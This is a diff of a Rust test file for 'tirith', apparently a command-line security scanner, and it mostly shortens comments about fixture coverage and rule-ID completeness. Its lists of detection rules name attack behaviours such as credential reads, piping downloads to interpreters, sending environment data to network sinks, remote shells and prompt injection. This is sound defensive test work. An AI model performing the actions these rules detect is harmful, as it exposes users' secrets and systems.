@@ -24,11 +24,8 @@ struct Fixture {
     shell: String,
     expected_action: String,
     expected_rules: Vec<String>,
-    /// Rule IDs that MUST NOT appear in the verdict. Use this to pin
-    /// double-fire boundaries — e.g. a fixture that should fire
-    /// `pipe_to_interpreter` but must NOT also fire
-    /// `ps_inline_download_execute`. The positive-only `expected_rules`
-    /// list would silently accept both, which is a regression risk.
+    /// Rule IDs that MUST NOT appear — pins double-fire boundaries the
+    /// positive-only `expected_rules` list would silently accept.
     #[serde(default)]
     forbidden_rules: Vec<String>,
     #[serde(default)]
@@ -125,9 +122,8 @@ fn run_fixture(fixture: &Fixture) {
             .collect::<Vec<_>>()
     );
 
-    // Build the found_rules list once for both positive and negative
-    // assertions. A fixture can declare `forbidden_rules` without any
-    // `expected_rules` (purely negative coverage), so compute up-front.
+    // Built once for both positive and negative assertions (a fixture may
+    // declare only `forbidden_rules`).
     let found_rules: Vec<String> = verdict
         .findings
         .iter()
@@ -265,10 +261,8 @@ fn test_policy_fixtures() {
     eprintln!("Passed {count} policy fixtures");
 }
 
-/// Documented-behavior regression guard. Every fixture in
-/// `tests/fixtures/documented_commands.toml` encodes a behavioral contract
-/// already promised to users in the README or TIRITH.md. A refactor that
-/// silently breaks one of those contracts fails here.
+/// Documented-behavior regression guard: every `documented_commands.toml`
+/// fixture encodes a contract promised in the README/TIRITH.md.
 #[test]
 fn test_documented_commands_fixtures() {
     let fixtures = load_fixtures("documented_commands.toml");
@@ -335,8 +329,7 @@ fn test_aifile_fixtures() {
 
 #[test]
 fn test_threatintel_fixtures() {
-    // Point the threat DB cache at the test fixture DB so that DB-dependent
-    // rules (threat_malicious_package, threat_malicious_ip, etc.) can fire.
+    // Point the threat DB cache at the test fixture DB so DB-dependent rules can fire.
     let test_db_path = fixtures_dir().join("test-threatdb.dat");
     assert!(
         test_db_path.exists(),
@@ -357,7 +350,6 @@ fn test_threatintel_fixtures() {
     tirith_core::threatdb::ThreatDb::refresh_cache();
 }
 
-/// Verify total fixture count across all files.
 #[test]
 fn test_fixture_count() {
     let files = [
@@ -413,8 +405,7 @@ fn test_tier1_coverage() {
                 _ => continue,
             };
 
-            // Paste context: byte scan catches bidi/zero-width/etc. directly,
-            // bypassing the tier-1 regex.
+            // Paste: byte scan catches bidi/zero-width/etc., bypassing the tier-1 regex.
             if scan_context == ScanContext::Paste {
                 let bytes = if !fixture.raw_bytes.is_empty() {
                     &fixture.raw_bytes
@@ -439,8 +430,7 @@ fn test_tier1_coverage() {
                 }
             }
 
-            // Exec context: byte scan for bidi/zero-width/etc. bypasses the
-            // tier-1 regex via the exec_bidi_triggered path in engine.rs.
+            // Exec: byte scan bypasses tier-1 via the exec_bidi_triggered path in engine.rs.
             if scan_context == ScanContext::Exec {
                 let byte_scan = tirith_core::extract::scan_bytes(fixture.input.as_bytes());
                 if byte_scan.has_bidi_controls
@@ -496,13 +486,11 @@ const ALL_FIXTURE_FILES: &[&str] = &[
     "threatintel.toml",
 ];
 
-/// Output-direction fixture files. NOT in `ALL_FIXTURE_FILES` — those drive
-/// `engine::analyze`, whereas output fixtures need `engine::analyze_output`.
+/// Output-direction fixtures — NOT in `ALL_FIXTURE_FILES` (those drive
+/// `engine::analyze`; output fixtures need `engine::analyze_output`).
 const OUTPUT_FIXTURE_FILES: &[&str] = &["output.toml"];
 
-/// Complete list of all RuleId variants (snake_case serialized form).
-/// MAINTENANCE: when adding a new RuleId variant, add it here too — the test
-/// will fail if a variant is missing, catching the omission.
+/// Every RuleId variant (snake_case). Add new variants here; the test fails otherwise.
 const ALL_RULE_IDS: &[&str] = &[
     // Hostname
     "non_ascii_hostname",
@@ -795,14 +783,8 @@ fn load_all_fixtures() -> Vec<(String, Fixture)> {
     all
 }
 
-/// Rules that depend on runtime state and cannot be tested via static fixtures.
-/// - proxy_env_set: requires HTTP_PROXY/HTTPS_PROXY env vars to be set
-/// - policy_blocklisted: requires a blocklist file in policy config
-/// - agent_denied_by_policy: requires an `agent_rules.deny` matcher in policy
-///   (M4 item 8 chunk 3 — covered by dedicated tests in
-///   `crates/tirith-core/src/policy.rs` and
-///   `crates/tirith-core/src/escalation.rs`)
-/// - license_required: emitted by license infrastructure, not detection rules
+/// Rules that depend on runtime state and cannot be tested via static fixtures
+/// (each is covered by dedicated unit/integration tests in its own module).
 const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
     "proxy_env_set",
     "policy_blocklisted",
@@ -815,9 +797,8 @@ const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
     "pdf_hidden_text",    // requires .pdf file input
     "config_malformed",   // requires MCP config filename context in file scan
     "vet_not_configured", // requires cargo install without cargo-vet
-    // Local-DB threat rules are covered by test-threatdb.dat in
-    // test_threatintel_fixtures. The rules below still depend on optional
-    // feeds or live APIs.
+    // Local-DB threat rules are covered via test-threatdb.dat; the rules below
+    // still depend on optional feeds or live APIs.
     "threat_malicious_url",      // requires supplemental URLhaus data
     "threat_phishing_url",       // requires supplemental phishing feeds
     "threat_tor_exit_node",      // requires supplemental Tor exit-node data
@@ -826,12 +807,8 @@ const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
     "threat_cisa_kev",           // requires live CISA KEV correlation
     "threat_suspicious_package", // requires live package-health lookups
     "threat_safe_browsing",      // requires a Google Safe Browsing API key
-    // M6 ch6 — package reputation rules emitted by package_risk /
-    // install_txn / ecosystem_scan paths, NOT by the engine. They require
-    // an `--online` registry-API run (or a recorded snapshot store) that
-    // static engine fixtures cannot produce; covered by unit tests in
-    // their own modules plus the ecosystem-fixture rows that document the
-    // signal shape.
+    // M6 ch6 — package reputation rules from package_risk / install_txn /
+    // ecosystem_scan, not the engine; need an `--online` registry-API run.
     "package_not_found_in_registry",
     "package_maintainer_change_recent",
     "package_ownership_transferred",
@@ -839,93 +816,52 @@ const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
     "package_dependency_confusion",
     "package_install_script_network_call",
     "package_repo_mismatch",
-    // M6 ch7 — policy-gated rules emitted by install_txn / ecosystem_scan
-    // paths, NOT by the engine. They require an `--online` registry-API
-    // signal AND a policy that crosses the configured threshold; static
-    // engine fixtures cannot drive both at once. Covered by ecosystem.toml
-    // rows that document the offline (no-fire) behavior plus dedicated unit
-    // tests in install_txn / ecosystem_scan.
+    // M6 ch7 — policy-gated rules from install_txn / ecosystem_scan; need an
+    // `--online` signal AND a policy crossing the threshold (can't drive both statically).
     "package_policy_newer_than_days",
     "package_policy_low_downloads",
     "package_policy_typosquat_distance",
     "package_policy_unknown_package_with_install_scripts",
     "package_policy_not_found",
-    // M7 ch1 — output-direction rules fire from `engine::analyze_output`,
-    // NOT the `engine::analyze` pipeline that the golden-fixture runner
-    // drives. They are covered by `tests/fixtures/output.toml` via a
-    // dedicated test (`test_output_fixtures`) below and by per-rule unit
-    // tests in `rules/output.rs` and `extract.rs::output_scan_tests`.
+    // M7 ch1 — output-direction rules fire from `engine::analyze_output`, not
+    // `engine::analyze`; covered by `output.toml` (`test_output_fixtures`).
     "output_osc52_clipboard_write",
     "output_hidden_text",
     "output_fake_prompt",
     "output_terminal_hyperlink_mismatch",
     "output_title_manipulation",
     "output_clear_screen",
-    // M7 fix: emitted from `analyze_output_finalize`/`_mut` when an OSC or
-    // CSI sequence is open at end-of-stream. Covered by dedicated tests in
-    // `extract.rs::output_scan_tests` and `engine.rs`; no `output.toml`
-    // fixture because the trigger is EOF state, not literal byte content.
+    // M7 fix: emitted at end-of-stream when an OSC/CSI sequence is still open;
+    // trigger is EOF state, not byte content (covered in output_scan_tests / engine.rs).
     "output_truncated_escape_sequence",
-    // M7 ch5 — prompt-injection rules fire from both
-    // `engine::analyze_output` (covered by `output.toml` via
-    // `test_output_fixtures` below) and from `engine::analyze` for
-    // Paste/FileScan (no engine.toml fixture yet — the dedicated CLI
-    // smoke tests in `crates/tirith/tests/cli_integration.rs` cover the
-    // file-scan path through `tirith logs scan`).
+    // M7 ch5 — prompt-injection rules fire from `analyze_output` (covered by
+    // `output.toml`) and from `analyze` for Paste/FileScan (covered by CLI smoke tests).
     "prompt_injection_in_output",
     "ignore_previous_instructions",
-    // M8 ch1 — operational-context rules require BOTH an active
-    // provider context (detected by `crate::context_detect`) AND an
-    // operator-supplied labels file. Static fixtures can't simulate the
-    // detector's output across CI environments (kube/aws/gcp/az config
-    // varies per host). Covered by unit tests in `rules/context.rs`
-    // plus the `context_command_fixtures` integration test below, which
-    // injects fake detection via `TIRITH_CONTEXT_DETECT_DISABLE=1` for
-    // the no-detection short-circuit case and confirms the no-label
-    // / read-only allow paths through the engine directly.
+    // M8 ch1 — operational-context rules need both an active provider context
+    // (`context_detect`) AND a labels file; covered by unit + integration tests below.
     "context_prod_destructive_command",
     "context_prod_write_operation",
     "context_prod_credential_change",
-    // M8 ch2 — SSH operational-context rules. Same shape as the M8 ch1
-    // context rules: they require an operator-supplied SSH host-labels
-    // file, which the static fixture runner does not seed. Block and
-    // Info paths are covered by per-rule unit tests in
-    // `rules/ssh_context.rs` plus integration tests below that inject a
-    // temp labels file via `TIRITH_POLICY_ROOT` + a fake `.git` boundary.
+    // M8 ch2 — SSH context rules need an SSH host-labels file (unseeded by the
+    // static runner); covered by unit tests + integration tests below.
     "ssh_remote_destructive_on_labeled_host",
     "ssh_remote_shell_on_labeled_host",
-    // M8 ch3 — IaC operational-context rules. The Medium auto-approve
-    // path fires from the engine with default policy (covered by
-    // `command.toml`). The High prod / hash-mismatch / apply-without-plan
-    // paths require either context detection OR
-    // `iac_require_plan_before_apply: true` — neither of which the static
-    // fixture runner injects. Covered by unit tests in `rules/iac.rs` and
-    // the dedicated `iac_rule_*` integration tests at the end of this
-    // file. `iac_plan_high_risk_changes` is emitted by
-    // `tirith iac check-plan`, not the engine.
+    // M8 ch3 — IaC rules: the High prod / hash-mismatch / apply-without-plan
+    // paths need context detection OR `iac_require_plan_before_apply: true`
+    // (unseeded statically); covered by unit + `iac_rule_*` integration tests.
+    // `iac_plan_high_risk_changes` comes from `tirith iac check-plan`, not the engine.
     "iac_apply_without_plan",
     "iac_apply_auto_approve_prod",
     "iac_destroy_prod",
     "iac_plan_high_risk_changes",
     "iac_plan_hash_mismatch",
-    // M8 ch5 — `docker_exec_prod_container` requires an operator-
-    // supplied `container:<name>` entry in `policy.context_labels`,
-    // which the static fixture runner does not seed. Covered by unit
-    // tests in `rules/container.rs`. The `docker_run_privileged` and
-    // `docker_run_sensitive_bind_mount` rules DO have static fixtures
-    // (see `command.toml`).
+    // M8 ch5 — `docker_exec_prod_container` needs a `container:<name>` label
+    // entry (unseeded statically); covered by unit tests in `rules/container.rs`.
     "docker_exec_prod_container",
-    // M9 ch1 — workstation hygiene rules fire ONLY from the
-    // `tirith hygiene scan|fix` filesystem walk (`crate::hygiene`), never
-    // from `engine::analyze` (the golden-fixture runner) or
-    // `analyze_output`. They are perm-/contents-/location-based checks
-    // against well-known sensitive paths under `~` + the repo root, which
-    // static text fixtures cannot reproduce (they need real files with
-    // real mode bits, not an input string). Covered by unit tests in
-    // `crates/tirith-core/src/hygiene.rs` (one positive + one negative per
-    // rule, using `tempfile::tempdir()`), following the M8 runtime-state
-    // pattern. The `configfile.toml` fixtures document the no-fire engine
-    // behavior for the file-content shapes.
+    // M9 ch1 — hygiene rules fire only from the `tirith hygiene scan|fix` FS
+    // walk; they need real files with real mode bits, not an input string.
+    // Covered by unit tests in `hygiene.rs` against `tempfile::tempdir()`.
     "hygiene_private_key_loose_perms",
     "hygiene_env_world_readable",
     "hygiene_kubeconfig_group_readable",
@@ -936,65 +872,33 @@ const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
     "hygiene_shell_history_secret_like",
     "hygiene_cloud_creds_bad_perms",
     "hygiene_db_dump_in_repo",
-    // M9 ch2 — persistence-mechanism state-change rules fire ONLY from the
-    // `tirith persistence diff|watch` snapshot comparison
-    // (`crate::persistence`), never from `engine::analyze` (the golden-fixture
-    // runner) or `analyze_output`. They detect a *change* (new/modified
-    // content) in a watched persistence surface relative to a recorded
-    // snapshot, which static text fixtures cannot reproduce (they need a
-    // real before/after filesystem state). Covered by unit tests in
-    // `crates/tirith-core/src/persistence.rs` against a `tempfile::tempdir()`
-    // root, following the M8 / M9-ch1 runtime-state pattern.
+    // M9 ch2 — persistence state-change rules fire only from `tirith persistence
+    // diff|watch`; they need a real before/after FS state. Covered by unit tests
+    // in `persistence.rs` against `tempfile::tempdir()`.
     "persistence_shell_rc_modified",
     "persistence_authorized_keys_new_entry",
     "persistence_crontab_modified",
     "persistence_launch_agent_added",
     "persistence_ssh_config_include",
     "persistence_direnv_new_envrc",
-    // M9 ch3 — shell-alias / function risk rules fire ONLY from the
-    // `tirith aliases scan|explain` parser (`crate::aliases`), which reads
-    // shell rc/profile files statically (and, opt-in, shells out with no-rc
-    // flags), never from `engine::analyze` (the golden-fixture runner) or
-    // `analyze_output`. They classify *parsed alias/function bodies*, which
-    // static text fixtures driving `engine::analyze` cannot reproduce (an
-    // alias definition is not an exec/paste input). Covered by unit tests in
-    // `crates/tirith-core/src/aliases.rs` against a `tempfile::tempdir()` root
-    // (always with `include_runtime=false`), following the M8 / M9-ch1 / ch2
-    // runtime-state pattern. The `configfile.toml` fixtures document the
-    // no-fire engine behavior for rc-file content shapes.
+    // M9 ch3 — alias/function rules fire only from the `tirith aliases
+    // scan|explain` parser over rc-file bodies (not exec/paste input). Covered
+    // by unit tests in `aliases.rs` against `tempfile::tempdir()`.
     "alias_overrides_critical_command",
     "alias_contains_network_call",
     "alias_contains_credential_read",
     "alias_recently_added",
-    // M9 ch4 — environment-variable lifecycle rules. Two fire from the
-    // `engine::analyze` exec hot path ONLY when `policy.env_guard_enabled` is
-    // set (opt-in, default false) — the static golden-fixture runner uses the
-    // default policy, so they never fire there. The third
-    // (`env_sensitive_persisted_in_shell_rc`) fires only from the
-    // `tirith env guard` rc-file scan (`crate::env_guard`), never the engine.
-    // The two exec rules additionally read `std::env` for the set-sensitive
-    // list, which a static text fixture cannot drive without an env mutation
-    // (the libc setenv race, PR #125). All three are covered by unit tests in
-    // `crates/tirith-core/src/env_guard.rs` that inject a synthetic
-    // sensitive-set / rc-file root, following the M8 context-rule pattern.
+    // M9 ch4 — env-lifecycle rules: two fire on the exec hot path only when
+    // `policy.env_guard_enabled` (opt-in) and read `std::env`; the third fires
+    // only from `tirith env guard`. Covered by unit tests in `env_guard.rs`.
     "env_sensitive_exposed_to_unknown_script",
     "env_sensitive_persisted_in_shell_rc",
     "env_printenv_to_network_sink",
-    // M9 ch5 — executable-provenance + PATH-shadowing rules. The THREE cheap
-    // hot-path rules (`exec_in_tmp`, `exec_in_repo_bin`,
-    // `path_writable_dir_before_system`) fire from `engine::analyze` (Exec)
-    // ONLY when `policy.exec_guard_enabled` is set — opt-in, default false — so
-    // the static golden-fixture runner (default policy) never fires them, and
-    // they additionally need a real on-disk leader path / a real writable
-    // `$PATH` dir, which a static text fixture cannot reproduce. The SEVEN
-    // expensive rules fire only from explicit `tirith exec check|provenance` /
-    // `tirith path audit|which` (they stat the file, shell out to
-    // `file`/`codesign`, and resolve the full PATH). All ten are covered by
-    // unit tests in `crates/tirith-core/src/exec_provenance.rs` and
-    // `crates/tirith-core/src/path_audit.rs` against `tempfile::tempdir()`
-    // roots with string-`$PATH` entry points (no `std::env::PATH` mutation —
-    // the libc setenv race, PR #125). `command.toml` carries rows documenting
-    // the no-fire default-policy hot-path behavior.
+    // M9 ch5 — exec-provenance + PATH-shadowing rules: the 3 cheap hot-path
+    // rules fire only when `policy.exec_guard_enabled` (opt-in) and need a real
+    // on-disk leader / writable `$PATH` dir; the 7 expensive ones fire only from
+    // `tirith exec check|provenance` / `tirith path audit|which`. Covered by unit
+    // tests in `exec_provenance.rs` / `path_audit.rs` (string-`$PATH`, no env mutation).
     "exec_in_tmp",
     "exec_recently_modified",
     "exec_world_writable",
@@ -1005,133 +909,62 @@ const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
     "path_duplicate_command_name",
     "path_dir_in_repo",
     "path_dir_in_tmp",
-    // M9 ch6 — repo-hook / automation guard rules fire from the
-    // `tirith hooks scan|guard|explain` scanner (`crate::repo_hooks`), which
-    // classifies a hook BODY as text. The three High rules
-    // (`repo_hook_network_call`, `repo_hook_credential_read`, `repo_hook_sudo`)
-    // can ALSO surface on the `engine::analyze` exec hot path, but ONLY when
-    // `policy.hooks_guard_enabled` is set (opt-in, default false) AND a hot-path
-    // git / package-manager command runs in a repo whose triggered hooks carry
-    // them — a repo-STATE + command trigger the static golden-fixture runner
-    // (default policy, no on-disk repo hooks) cannot reproduce. The two Medium
-    // rules never reach the hot path at all. All five are covered by unit tests
-    // in `crates/tirith-core/src/repo_hooks.rs` against `tempfile::tempdir()`
-    // roots with the `scan_for_repo` / `scan_triggered_by_leader` entry points.
-    // The `configfile.toml` fixtures document the no-fire engine behavior for
-    // hook-body content shapes scanned as a generic file.
+    // M9 ch6 — repo-hook rules fire from `tirith hooks scan|guard|explain` over
+    // hook bodies; the 3 High ones can also reach the exec hot path only when
+    // `policy.hooks_guard_enabled` (opt-in) + on-disk repo hooks exist. Covered
+    // by unit tests in `repo_hooks.rs` against `tempfile::tempdir()`.
     "repo_hook_network_call",
     "repo_hook_credential_read",
     "repo_hook_sudo",
     "repo_hook_suspicious_shell_pattern",
     "repo_hook_external_fetch",
-    // M10 ch1 — blast-radius SIMULATOR-ONLY rules. These fire ONLY from
-    // `tirith preview -- "<cmd>"` via `blast_radius::simulate` +
-    // `report_findings`, which WALK THE FILESYSTEM (depth ≤ 5, ≤ 100k files),
-    // expand globs against cwd, and count files/dirs/symlinks. The
-    // `engine::analyze` golden-fixture runner never walks the filesystem (that
-    // is `preview`'s job, off the hot path), so a static text fixture cannot
-    // reproduce them — they need a real on-disk target tree. Covered by unit
-    // tests in `crates/tirith-core/src/blast_radius.rs` against
-    // `tempfile::tempdir()` trees. The FOUR CHEAP hot-path rules
-    // (`blast_writes_system_path`, `blast_empty_var_glob`, `blast_find_delete`,
-    // `blast_rsync_delete`) DO have static `command.toml` fixtures because they
-    // fire by string shape with no filesystem access.
+    // M10 ch1 — blast-radius simulator-only rules fire only from `tirith preview`
+    // (walks the FS, expands globs); they need a real on-disk tree. Covered by
+    // unit tests in `blast_radius.rs`. The 4 cheap string-shape rules have
+    // static `command.toml` fixtures.
     "blast_deletes_outside_repo",
     "blast_symlink_traversal",
     "blast_large_file_count",
-    // M10 ch2 — the post-run shell-rc-modified rule fires ONLY from the
-    // `tirith watch -- "<cmd>"` post-run diff (snapshot → run → snapshot), never
-    // from the `engine::analyze` golden-fixture runner. It needs a real
-    // before/after on-disk rc-file state that a static text fixture cannot
-    // reproduce. Covered by a unit test in `crates/tirith/src/cli/checkpoint.rs`
-    // (`watch_flags_shell_rc_modification`), following the M9-ch2 runtime-state
-    // pattern.
+    // M10 ch2 — post-run shell-rc-modified fires only from `tirith watch`'s
+    // post-run diff; needs a real before/after rc state. Covered by a unit test
+    // in `cli/checkpoint.rs`.
     "post_run_shell_rc_modified",
-    // M10 ch3 — tainted-content tracking rules fire from `engine::analyze` (Exec)
-    // ONLY when the parsed leader (or an interpreter/`source` file argument) is a
-    // path recorded in the JSONL taint store at `state_dir()/taint.jsonl`. The
-    // static golden-fixture runner uses no taint store (and never writes to the
-    // real `state_dir()`), so a text fixture cannot drive either rule — the
-    // trigger is runtime state, not input content. Covered by unit tests in
-    // `crates/tirith-core/src/taint.rs` (store round-trip against a
-    // `tempfile::tempdir()`) plus `engine.rs` taint hot-path tests that point the
-    // lookup at a temp store, following the M8/M9 runtime-state pattern.
+    // M10 ch3 — taint-tracking rules fire on the exec path only when the leader
+    // (or a sourced/interpreter file arg) is in the taint store at
+    // `state_dir()/taint.jsonl`. Covered by unit tests in `taint.rs` + `engine.rs`
+    // hot-path tests pointed at a temp store.
     "exec_of_tainted_file",
     "command_sourced_from_tainted_file",
-    // M10 ch5 — anomaly-detection rules fire from `engine::analyze` ONLY when
-    // `policy.baseline_enabled` is set (opt-in, default false) AND another
-    // detection rule already fired, via a lookup of the firing finding's
-    // privacy-hashed tuple in the runtime baseline store at
-    // `state_dir()/baseline.jsonl`. The static golden-fixture runner uses the
-    // default policy (baseline off) and no baseline store, so a text fixture
-    // cannot drive either rule — the trigger is runtime state, not input
-    // content. Covered by unit tests in `crates/tirith-core/src/baseline.rs`
-    // against a `tempfile::tempdir()` store.
+    // M10 ch5 — anomaly rules fire only when `policy.baseline_enabled` (opt-in)
+    // AND another rule already fired, via the baseline store at
+    // `state_dir()/baseline.jsonl`. Covered by unit tests in `baseline.rs`.
     "anomaly_first_time_in_this_repo",
     "anomaly_rare_in_baseline",
-    // M11 ch1 — command-card rules fire from `engine::analyze` (Exec) when a
-    // card reference is supplied via the `--card <path>` sidecar flag or a
-    // leading `# tirith-card: <local-path>` shell comment. Verification needs
-    // runtime state a static text fixture cannot reproduce: a signed card file
-    // on disk AND a trusted ed25519 pubkey under
-    // `~/.config/tirith/trusted-card-keys/`. Covered by unit tests in
-    // `crates/tirith-core/src/command_card.rs` (sign/verify/evaluate against a
-    // `tempfile::tempdir()` trusted-keys dir) plus the `command_card_*` CLI
-    // integration tests in `crates/tirith/tests/cli_integration.rs` (full
-    // create -> sign -> trust -> check round trip, the mismatch case, and the
-    // no-hot-path-network URL-comment case).
+    // M11 ch1 — command-card rules need a signed card on disk + a trusted
+    // ed25519 pubkey; covered by unit tests in `command_card.rs` and the
+    // `command_card_*` CLI integration tests.
     "command_card_verified",
     "command_card_unverified",
     "command_card_mismatch",
-    // M11 ch2 — repo-command-manifest rules fire from `engine::analyze` (Exec)
-    // only when a `.tirith/commands.yaml` exists on disk for the repo discovered
-    // from `ctx.cwd` (walk up to the `.git` boundary, or
-    // `TIRITH_POLICY_ROOT/.tirith/commands.yaml`). The static golden-fixture
-    // runner uses `cwd: None`, so no manifest is discovered and neither rule
-    // fires — a runtime-state trigger a text fixture cannot reproduce. Covered
-    // by unit tests in `crates/tirith-core/src/commands_manifest.rs` plus the
-    // `engine::tests::manifest_*` integration tests (including the load-bearing
-    // "manifest cannot weaken a High finding" regression) against
-    // `tempfile::tempdir()` repos. `command.toml` carries no-fire rows
-    // documenting the default (no-manifest) behavior.
+    // M11 ch2 — repo-command-manifest rules fire only when a
+    // `.tirith/commands.yaml` exists for the discovered repo (the static runner
+    // uses `cwd: None`). Covered by unit tests in `commands_manifest.rs` plus the
+    // `engine::tests::manifest_*` tests (incl. the "manifest cannot weaken a High
+    // finding" regression).
     "repo_command_unknown",
     "repo_command_dangerous_pattern",
-    // M11 ch3 — the honeytoken / canary rule fires from `engine::analyze`
-    // (paste + exec) AND `engine::analyze_output` ONLY when a token registered
-    // in the local canary store at `state_dir()/canaries.jsonl` appears in the
-    // scanned text. The static golden-fixture runner writes no canary store
-    // (and never touches the real `state_dir()`), so a text fixture cannot drive
-    // the rule — the trigger is runtime store state plus a substring match, not
-    // input content. Covered by unit tests in `crates/tirith-core/src/canary.rs`
-    // (create/detect/prune/rotate round-trips against a `tempfile::tempdir()`
-    // store) plus the `engine::tests::canary_*` wiring tests that point the
-    // lookup at a temp store, following the M10 taint/anomaly runtime-state
-    // pattern.
+    // M11 ch3 — the canary rule fires (paste/exec/output) only when a token in
+    // the store at `state_dir()/canaries.jsonl` appears in the text. Covered by
+    // unit tests in `canary.rs` + `engine::tests::canary_*` against a temp store.
     "canary_token_touched",
-    // M12 ch1 — the paste-provenance rule fires from `engine::analyze` in
-    // `ScanContext::Paste` ONLY when a companion browser extension has written a
-    // record at `state_dir()/clipboard_source.json` AND the pasted content's
-    // SHA-256 matches the record's `content_sha256` AND a URL host in the paste
-    // differs from the recorded source host. The static golden-fixture runner
-    // writes no companion record (and never touches the real `state_dir()`), so a
-    // text fixture cannot drive the rule — the trigger is runtime companion-file
-    // state plus a content-hash match, not input content alone. Covered by unit
-    // tests in `crates/tirith-core/src/rules/paste_provenance.rs` (against a
-    // `tempfile::tempdir()` record via the `check_at` seam) plus a CLI
-    // integration test that writes a `clipboard_source.json` into an isolated
-    // `XDG_STATE_HOME`, following the M11 canary runtime-state pattern.
+    // M12 ch1 — paste-provenance fires (Paste) only when a companion record at
+    // `state_dir()/clipboard_source.json` matches the paste's SHA-256 AND a URL
+    // host differs from the recorded source host. Covered by unit tests in
+    // `rules/paste_provenance.rs` plus a CLI integration test.
     "paste_source_mismatch",
-    // M13 ch5 — AI-config drift rules fire ONLY from `tirith ai diff`
-    // (`crate::rules::aifile::diff_findings`), which compares each current
-    // AI-config file to the last-known-safe snapshot at
-    // `state_dir()/ai_config_snapshot.json`. The static golden-fixture runner
-    // drives `engine::analyze` (and `analyze_output`) only — it never runs a
-    // snapshot diff — so a text fixture cannot drive these rules: the trigger is
-    // a snapshot-vs-current diff, not input content alone. They are
-    // diff-triggered (not PATTERN_TABLE), exactly like `paste_source_mismatch`
-    // and `canary_token_touched`. Covered by unit tests for the diff producers
-    // in `crates/tirith-core/src/rules/aifile.rs` plus CLI integration tests
-    // that plant a snapshot + a changed file under an isolated `XDG_STATE_HOME`.
+    // M13 ch5 — AI-config drift rules fire only from `tirith ai diff` (a
+    // snapshot-vs-current diff against `state_dir()/ai_config_snapshot.json`),
+    // not PATTERN_TABLE. Covered by unit tests in `rules/aifile.rs` + CLI tests.
     "ai_config_hidden_instruction_added",
     "ai_config_tool_use_escalation",
 ];
@@ -1149,9 +982,8 @@ fn collect_output_fixture_rules() -> HashSet<String> {
     covered
 }
 
-/// Drive the output-direction rule pipeline against the dedicated fixture
-/// files. This is the analogue of [`test_hostname_fixtures`] etc. for the
-/// `engine::analyze_output` sibling pipeline.
+/// Drive the output-direction pipeline (`engine::analyze_output`) against its
+/// dedicated fixtures — the analogue of [`test_hostname_fixtures`] etc.
 #[test]
 fn test_output_fixtures() {
     use tirith_core::engine::{analyze_output, OutputContext};
@@ -1212,9 +1044,7 @@ fn test_output_fixtures() {
     }
 }
 
-/// Sibling of `test_all_rule_ids_have_fixture_coverage` that pins coverage
-/// for the 6 output-direction rules and the 2 prompt-injection rules
-/// against the `output.toml` fixtures.
+/// Pins `output.toml` coverage for the 6 output + 2 prompt-injection rules.
 #[test]
 fn test_output_rule_ids_have_fixture_coverage() {
     let covered = collect_output_fixture_rules();
@@ -1268,27 +1098,19 @@ fn test_all_rule_ids_have_fixture_coverage() {
     );
 }
 
-/// Generate the canonical list of every [`RuleId`] variant AND a compile-time
-/// exhaustiveness guard from a SINGLE source.
-///
-/// `all_rule_id_variants()` returns the listed variants; `_rule_id_exhaustive`
-/// is an exhaustive `match` (NO `_` arm) over the SAME list. Because the match
-/// is exhaustive, adding a new variant to the `RuleId` enum without adding it to
-/// THIS macro invocation fails to compile here — so the returned list (and its
-/// `.len()`) is genuinely enum-derived, not a hand-maintained `vec!` that can
-/// silently drift (the bug this replaced: the old `vec!` literal let 5 M11
-/// variants fall out of the completeness lists without any compile error).
+/// Generate the canonical [`RuleId`] variant list AND a compile-time
+/// exhaustiveness guard from a single source: `_rule_id_exhaustive`'s `match`
+/// (no `_` arm) fails to compile if a new enum variant isn't listed here, so the
+/// returned list is genuinely enum-derived rather than a drift-prone `vec!`.
 macro_rules! rule_id_variant_registry {
     ($($variant:ident),+ $(,)?) => {
-        /// Every `RuleId` variant, in declaration order. Compiler-guaranteed
-        /// complete via `_rule_id_exhaustive` below.
+        /// Every `RuleId` variant; completeness enforced by `_rule_id_exhaustive`.
         fn all_rule_id_variants() -> Vec<tirith_core::verdict::RuleId> {
             use tirith_core::verdict::RuleId;
             vec![ $(RuleId::$variant),+ ]
         }
 
-        /// Compile-time completeness guard: the exhaustive match (no `_` arm)
-        /// forces every enum variant to appear in the macro invocation above.
+        /// Compile-time completeness guard (exhaustive match, no `_` arm).
         #[allow(dead_code)]
         fn _rule_id_exhaustive(r: tirith_core::verdict::RuleId) {
             use tirith_core::verdict::RuleId;
@@ -1404,12 +1226,8 @@ rule_id_variant_registry! {
     AiConfigHiddenInstructionAdded, AiConfigToolUseEscalation,
 }
 
-/// Verify ALL_RULE_IDS stays in sync with the actual RuleId enum.
-///
-/// The variant list comes from [`all_rule_id_variants`], whose completeness is
-/// COMPILE-TIME enforced by the `_rule_id_exhaustive` match generated alongside
-/// it (no `_` arm) — so adding a `RuleId` variant without registering it fails
-/// to compile, and the count below is genuinely enum-derived.
+/// Verify ALL_RULE_IDS stays in sync with the RuleId enum (the variant count is
+/// enum-derived via the compile-time-enforced [`all_rule_id_variants`]).
 #[test]
 fn test_rule_id_list_is_complete() {
     let all_variants = all_rule_id_variants();
@@ -1423,8 +1241,7 @@ fn test_rule_id_list_is_complete() {
         );
     }
 
-    // The enum-derived variant count (compile-time-complete via the exhaustive
-    // guard) must equal ALL_RULE_IDS — catches a stale/extra entry in the const.
+    // Count must match — catches a stale/extra entry in the const.
     assert_eq!(
         ALL_RULE_IDS.len(),
         all_variants.len(),
@@ -1436,8 +1253,7 @@ fn test_rule_id_list_is_complete() {
 
 #[test]
 fn test_no_url_rules_have_no_url_fixtures() {
-    // Rules that CAN fire when the input has no URL at all.
-    // These need their own tier-1 pattern (not just :// or git@).
+    // Rules that fire with no URL — they need their own tier-1 pattern (not :// or git@).
     let no_url_rules: HashSet<&str> = [
         "dotfile_overwrite",
         "archive_extract",
@@ -1533,8 +1349,7 @@ fn test_extractor_ids_cover_rule_triggers() {
         .copied()
         .collect();
 
-    // Each rule category requires at least one extractor to trigger tier-1.
-    // Map: rule category → required extractor IDs.
+    // Each rule category → the extractor IDs it needs to trigger tier-1.
     let required_extractors: Vec<(&str, &[&str])> = vec![
         // URL-based rules need at least one URL trigger
         ("hostname rules", &["standard_url"]),
@@ -1677,9 +1492,8 @@ fn test_tier1_does_not_gate_findings() {
     );
